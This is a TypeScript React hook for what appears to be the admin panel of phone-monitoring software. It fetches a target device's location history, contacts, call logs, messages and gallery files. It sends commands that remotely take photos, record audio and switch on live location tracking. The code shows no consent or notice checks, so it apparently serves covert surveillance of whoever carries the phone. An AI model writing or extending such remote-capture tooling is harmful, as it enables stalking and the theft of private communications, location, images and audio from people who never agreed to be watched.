// components/admin/devices/useDeviceDetail.ts
"use client";

import { useEffect, useState, useCallback } from "react";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { createClient } from "@/lib/supabase/client";

const tabCache = new Map<string, { data: any; time: number }>();

export function useDeviceDetail(deviceId: string) {
  const [device, setDevice] = useState<MonitoredDevice | null>(null);
  const [locations, setLocations] = useState<DeviceLocation[]>([]);
  const [contacts, setContacts] = useState<DeviceContact[]>([]);
  const [calls, setCalls] = useState<DeviceCall[]>([]);
  const [messages, setMessages] = useState<DeviceMessage[]>([]);
  const [captures, setCaptures] = useState<any[]>([]);
  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
  const [files, setFiles] = useState<DeviceFileItem[]>([]);
  const [filesLoading, setFilesLoading] = useState(false);
  const [appCount, setAppCount] = useState(0);
  const [activeTab, setActiveTab] = useState("map");
  const [loading, setLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  const [isLiveMovement, setIsLiveMovement] = useState(false);

  const showToast = (msg: string) => { setToast(msg); setTimeout(() => setToast(null), 3500); };

  const fetchLightStatus = useCallback(async () => {
    if (!deviceId) return;
    try {
      const t = Date.now();
      const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
      const [devRes, locRes, cmdRes] = await Promise.all([
        fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=locations&limit=25&_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/commands?_t=${t}`, noStore).then((r) => r.json()),
      ]);

      if (devRes.device) {
        setDevice(devRes.device);
        if (devRes.device.counts?.apps) setAppCount(devRes.device.counts.apps);
      }
      if (locRes.locations) setLocations(locRes.locations);
      if (cmdRes.commands) {
        setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
        setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
      }
    } catch (err) {
      console.error("Telemetry fetch error", err);
    } finally {
      setLoading(false);
    }
  }, [deviceId]);

  const fetchTabData = useCallback(async (tab: string, bypass = false) => {
    if (!deviceId) return;
    const cacheKey = `${deviceId}:${tab}`;
    const cached = tabCache.get(cacheKey);
    if (!bypass && cached && Date.now() - cached.time < 120000) {
      if (tab === "contacts") setContacts(cached.data);
      else if (tab === "calls") setCalls(cached.data);
      else if (tab === "messages") setMessages(cached.data);
      else if (tab === "gallery") setFiles(cached.data);
      return;
    }
    const t = Date.now();
    const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
    const load = async (type: string, limit: number, setter: (d: any) => void) => {
      try {
        const res = await fetch(`/api/devices/${deviceId}/data?type=${type}&limit=${limit}&_t=${t}`, noStore).then((r) => r.json());
        if (res[type]) {
          setter(res[type]);
          tabCache.set(cacheKey, { data: res[type], time: Date.now() });
        }
      } catch (e) { console.error(e); }
    };
    if (tab === "contacts") await load("contacts", 10000, setContacts);
    else if (tab === "calls") await load("calls", 2500, setCalls);
    else if (tab === "messages") await load("messages", 5000, setMessages);
    else if (tab === "gallery") {
      setFilesLoading(true);
      await load("files", 300, setFiles);
      setFilesLoading(false);
    }
  }, [deviceId]);

  useEffect(() => { fetchTabData(activeTab); }, [activeTab, fetchTabData]);

  const handleFullRefresh = async () => {
    setIsRefreshing(true);
    tabCache.clear();
    showToast("🔄 Refreshing all device & tab data...");
    await Promise.all([fetchLightStatus(), fetchTabData(activeTab, true)]);
    showToast("✅ Everything updated successfully!");
    setIsRefreshing(false);
  };

  useEffect(() => {
    fetchLightStatus();
    const interval = setInterval(fetchLightStatus, 12000);
    return () => clearInterval(interval);
  }, [fetchLightStatus]);

  useEffect(() => {
    if (!deviceId || !isLiveMovement) return;
    const channel = createClient().channel(`device-live:${deviceId}`)
      .on("broadcast", { event: "location" }, (p: any) => {
        if (p.payload?.latitude && p.payload?.longitude) setLocations((prev) => [p.payload, ...prev.slice(0, 49)]);
      }).subscribe();
    return () => { createClient().removeChannel(channel); };
  }, [deviceId, isLiveMovement]);

  const sendCommand = async (command: string, payload = {}, label = "Command") => {
    await fetch(`/api/devices/${deviceId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command, payload }),
    });
    showToast(`⚡ ${label} sent to phone!`);
    fetchLightStatus();
  };

  const handleToggleLiveMovement = (active: boolean) => {
    setIsLiveMovement(active);
    sendCommand(active ? "start_live_movement" : "stop_live_movement", {}, active ? "Live Movement ON" : "Live Movement OFF");
  };

  const deleteItem = async (entity: string, paramKey: string, id: string, label: string, filterState?: (id: string) => void) => {
    await fetch(`/api/devices/${deviceId}/data/${entity}?${paramKey}=${id}`, { method: "DELETE" });
    showToast(`🗑️ ${label} deleted!`);
    if (filterState) filterState(id);
    tabCache.clear();
  };

  const bulkDelete = async (entity: string, label: string, clearState?: () => void) => {
    await fetch(`/api/devices/${deviceId}/data/${entity}`, { method: "DELETE" });
    showToast(`🗑️ All ${label} deleted!`);
    if (clearState) clearState();
    tabCache.clear();
  };

  return {
    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, appCount,
    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement,
    handleFullRefresh, handleToggleLiveMovement, sendCommand,
    handleDeleteCommand: (id: string) => {
      fetch(`/api/devices/${deviceId}/commands?command_id=${id}`, { method: "DELETE" });
      showToast("🗑️ Item deleted!");
      fetchLightStatus();
    },
    handleDeleteContact: (id: string) => deleteItem("contacts", "contact_id", id, "Contact", (cid) => setContacts(p => p.filter(c => c.id !== cid))),
    handleDeleteCall: (id: string) => deleteItem("calls", "call_id", id, "Call log", (cid) => setCalls(p => p.filter(c => c.id !== cid))),
    handleDeleteMessage: (id: string) => deleteItem("messages", "message_id", id, "Message", (mid) => setMessages(p => p.filter(m => m.id !== mid))),
    handleDeleteApp: (id: string) => deleteItem("apps", "app_id", id, "App record"),
    handleDeleteFile: (id: string) => deleteItem("files", "file_id", id, "File", (fid) => setFiles(p => p.filter(f => f.id !== fid))),
    handleBulkDeleteContacts: () => bulkDelete("contacts", "contacts", () => setContacts([])),
    handleBulkDeleteCalls: () => bulkDelete("calls", "call logs", () => setCalls([])),
    handleBulkDeleteMessages: () => bulkDelete("messages", "messages", () => setMessages([])),
    handleBulkDeleteApps: () => bulkDelete("apps", "app records"),
    handleBulkDeleteFiles: () => bulkDelete("files", "gallery files", () => setFiles([])),
  };
}
